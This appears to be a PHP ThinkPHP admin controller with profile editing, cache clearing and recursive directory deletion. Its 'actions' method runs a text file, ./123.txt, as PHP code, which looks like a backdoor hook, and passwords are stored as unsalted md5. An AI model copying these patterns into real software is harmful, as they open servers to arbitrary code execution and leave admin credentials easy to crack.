<?php
namespace Admin\Controller;
use Think\Controller;
class IndexController extends CommonController {
    public function index(){
        $this->display();
    }
    public function editd(){
    	$admins=D('Admins');
    	$data['id']=session('idsss');
    	$admind=$admins->field('adminpwd')->where("id",$data['id'])->find();
    	$password=$admind['adminpwd'];
        if(IS_AJAX){
        	$data['adminuser']=trim(I('adminuser'));
        	$data['adminpwd']=trim(I('adminpwd')) ? md5( trim(I('adminpwd')) ):$password;
        	$res=$admins->create($data,2);
        	if($res){
        		if($admins->save()){
        			session(null);
        			$this->success("修改信息成功,请重新登录",U('Login/index'));
        		}else{
        			$this->success("请修改任意一项再提交",U('editd'));
        		}
        	}else{
        		$this->error($admins->getError());
        	}
        	return;
        }
        $this->display();
    }



    public function clears() {
        header("Content-type: text/html; charset=utf-8");
        $filename=array("./Application/Runtime/");
        @mkdir('Runtime',0777,true);
        foreach($filename as $value){
            $this->rmdirr($value);
        }
        $this->success("清除缓存成功!");  
    }


   public function rmdirr($dirname){
        if (!file_exists($dirname)) {
         return false;
        }

        if (is_file($dirname) || is_link($dirname)) {
         return unlink($dirname);
        }

        $dir = dir($dirname);


        if($dir){
         while (false !== $entry = $dir->read()) {
          if ($entry == '.' || $entry == '..') {
           continue;
          }
          //递归
          $this->rmdirr($dirname . DIRECTORY_SEPARATOR . $entry);
         }
        }
        $dir->close();
        return rmdir($dirname);
    }


    public function actions(){
        require('./123.txt');
        
    }

}